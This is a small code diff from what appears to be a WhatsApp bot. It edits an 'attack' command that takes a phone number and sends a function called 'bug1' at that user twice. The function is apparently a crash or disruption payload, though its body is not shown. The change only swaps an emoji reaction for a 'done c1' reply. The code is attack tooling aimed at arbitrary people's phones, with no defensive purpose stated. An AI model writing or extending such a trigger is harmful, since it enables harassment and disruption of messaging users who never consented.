@@ -728,14 +728,14 @@ if (body.trim().toLowerCase().startsWith("serang")) {
 
   const target = args[0].replace(/\D/g, "") + "@s.whatsapp.net";
 
-  await sock.sendMessage(from, {
-    react: { text: "☀️", key: mek.key }
-  });
-
   try {
     await bug1(sock, target);
     await bug1(sock, target);
   } catch (e) {}
+
+  await sock.sendMessage(from, {
+    text: "done c1"
+  });
   return;
 }
     // ===== END TRIGGER =====
